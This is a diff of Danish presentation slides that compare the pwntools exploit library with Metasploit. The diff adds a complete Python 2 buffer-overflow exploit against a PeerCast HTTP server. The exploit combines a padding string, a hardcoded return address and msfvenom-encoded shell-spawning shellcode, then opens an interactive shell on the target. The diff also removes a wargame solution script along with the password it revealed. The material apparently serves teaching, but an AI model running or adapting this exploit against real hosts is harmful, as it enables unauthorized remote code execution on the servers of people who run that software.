@@ -20,35 +20,34 @@ pwntools - Hvorfor ikke Metasploit?
 
 [source,sh]
 ------------------------------------------------
-$ cat exploit.py 
-#!/usr/bin/env python2
-
-from pwn import *
-
-r = ssh('level1', 'io.smashthestack.org', password = 'level1')
-shell = r.shell()
-shell.sendlineafter('$ ', '/levels/level01')
-shell.sendlineafter(': ', '271')
-shell.sendlineafter('$ ', 'cat /home/level2/.pass')
-password = shell.recvuntil('$ ').split('\n')[1].strip()
-shell.close()
-shell.wait_for_close()
-log.info('level2 users password: %s' % password)
-$ ./exploit.py 
-[+] Connecting to io.smashthestack.org on port 22: Done
-[+] Opening new channel: None: Done
-[*] Closed SSH channel with io.smashthestack.org
-[*] level2 users password: XNWFtWKWHhaaXoKI
-$
+vagrant@localhost:~$ find .repositories/metasploit-framework/modules/exploits/linux -name '*.rb' | xargs wc -l | sort -nr | tail -n 1
+    67 .repositories/metasploit-framework/modules/exploits/linux/http/peercast_url.rb
 ------------------------------------------------
 
 pwntools - Hvorfor ikke Metasploit?
 -----------------------------------
 
-[source,sh]
+[source,python]
 ------------------------------------------------
-vagrant@localhost:~$ find .repositories/metasploit-framework/modules/exploits/linux -name '*.rb' | xargs wc -l | sort -nr | tail -n 1
-    67 .repositories/metasploit-framework/modules/exploits/linux/http/peercast_url.rb
+#!/usr/bin/env python2
+
+from pwn import *
+import sys
+
+#Generated with:
+#shellcraft i386.linux.findpeersh | msfvenom --encoder x86/shikata_ga_nai --bad-chars '\x00\x0a\x0d\x20\x2f\x3d\x3b' --arch x86 --platform linux --format python
+buf =  ""
+buf += "\xbd\xf4\x6e\x99\x72\xd9\xe8\xd9\x74\x24\xf4\x5e\x2b"
+buf += "\xc9\xb1\x10\x83\xee\xfc\x31\x6e\x10\x03\x6e\x10\x16"
+buf += "\x9b\xf3\x8d\xbc\x63\x8d\x97\x1b\x32\xe7\x31\xc3\x8c"
+buf += "\x7a\xf1\xd7\xf0\xef\x0e\x77\x3c\x6f\x8b\xb7\xdf\x2a"
+buf += "\xe1\xda\xa9\x38\x63\x27\xf3\xf7\x1e\x18\x5b\xc5\x5f"
+buf += "\x13\xa3\xbf\x37\xb3\x7c\x6f\xe7\x30\xeb\x40\x95\xdf"
+buf += "\x85\x17\xba\x2e\x93\x42\x36\x08\xba\x5e\xc8"
+
+r = remote(sys.argv[1], 80)
+r.send('GET /stream/?' + 'A' * 780 + p32(0x080922f7) + buf + '\r\n\r\n')
+r.interactive()
 ------------------------------------------------
 
 pwntools
